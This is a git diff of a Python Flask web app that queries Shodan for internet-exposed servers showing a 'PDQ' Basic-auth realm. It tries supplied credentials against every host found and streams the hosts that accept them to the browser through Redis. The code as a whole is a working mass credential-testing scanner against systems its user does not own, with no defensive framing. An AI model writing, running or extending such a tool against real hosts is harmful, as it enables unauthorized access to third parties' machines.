@@ -1,59 +1,74 @@
-import json
-import time
+import os
+import threading
+from time import sleep
 
+import redis
 import requests
 import shodan
-from flask import Flask, json, render_template, request
-from requests.models import HTTPBasicAuth
+from dotenv import load_dotenv
+from flask import Flask, Response, render_template, request
 
-def call_api(api, query, user, passw, pageCount):
+load_dotenv()
+
+REDIS_URL = os.getenv('REDIS_URL')
+REDIS_PORT = os.getenv('REDIS_PORT')
+REDIS_PASSWORD = os.getenv('REDIS_PASSWORD')
+
+app = Flask(__name__)
+r = redis.Redis(host=REDIS_URL, port=REDIS_PORT, password=REDIS_PASSWORD)
+query = 'WWW-Authenticate: Basic Realm="PDQ"'
+instanceResults = []
+api_reqs = []
+
+def call_api(apiKey, user, passw, pageCount):
+    api = shodan.Shodan(apiKey)
+    global instanceResults
     # get all pages from pageCount
     page = 1
-    pages = []
     while page <= int(pageCount):
-        print('doing things')
         try:
-            pages.append(api.search(query, page=page))
-            page += 1
+            instances = api.search(query, page=page)
+            # filter through all pages/test creds
+            for instance in instances['matches']:
+                try:
+                    reqString = f"http://{user}:{passw}@{instance['ip_str']}:{instance['port']}"
+                    res = requests.get(reqString)
+                    sleep(0.5)
+                    if res.status_code == 200: # successful
+                        instanceResults.append(reqString)
+                        r.publish('updates', reqString)
+                        print(reqString)
+                except requests.exceptions.ConnectionError as e:
+                    print(f'Connection Error: {e}')
         except shodan.APIError as e:
             print(f'Error: {e}')
             return [e] # return as list due to html template looking for iterable
-    # filter through all pages/test creds
-    instanceResults = []
-    for instance in pages():
-        for match in instance:
-            try:
-                print(match)
-                res = requests.get(f'https://{user}:{passw}@{match["ip_str"]}:{match["port"]}')
-                if res.status_code == 200: # successful
-                    instanceResults.append(match)
-                    #textResults.append('http://' + user + ':' + passw + '@' + instance['ip_str'] + ':' + str(instance['port']))
-            except requests.exceptions.ConnectionError as e:
-                print(f'Connection Error: {e}')
+        page += 1
 
-    # return results
-    jsonInstanceResults = json.dumps(instanceResults)
-    return jsonInstanceResults
-
-app = Flask(__name__)
-
-@app.route('/')
-@app.route('/index')
+@app.route('/', methods=['GET', 'POST'])
+@app.route('/index', methods=['GET', 'POST'])
 def index():
-    return render_template('index.html')
-
-@app.route('/scrape', methods=['POST', 'GET'])
-def scrape():
-    if request.method == 'GET':
-        return index()
-    else:
-        api_key = request.form['shodan-api-key']
-        api = shodan.Shodan(api_key)
-        query = 'WWW-Authenticate: Basic Realm="PDQ"'
+    if request.method == 'POST':
+        apiKey = request.form['shodan-api-key']
         user = request.form['username']
         passw = request.form['password']
         pageCount = request.form['page-count']
-        return render_template('index.html', query_results=call_api(api, query, user, passw, pageCount))
+        bgThread = threading.Thread(target=call_api, args=[apiKey, user, passw, pageCount])
+        bgThread.start()
+        print('Thread started')
+
+    return render_template('index.html')
+
+
+@app.route('/stream')
+def stream():
+    def event_stream():
+        pubsub = r.pubsub()
+        pubsub.subscribe('updates')
+        for message in pubsub.listen():
+            if message['type'] == 'message':
+                yield 'data:{}\n\n'.format(message['data'].decode())
+    return Response(event_stream(), mimetype='text/event-stream')
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run()
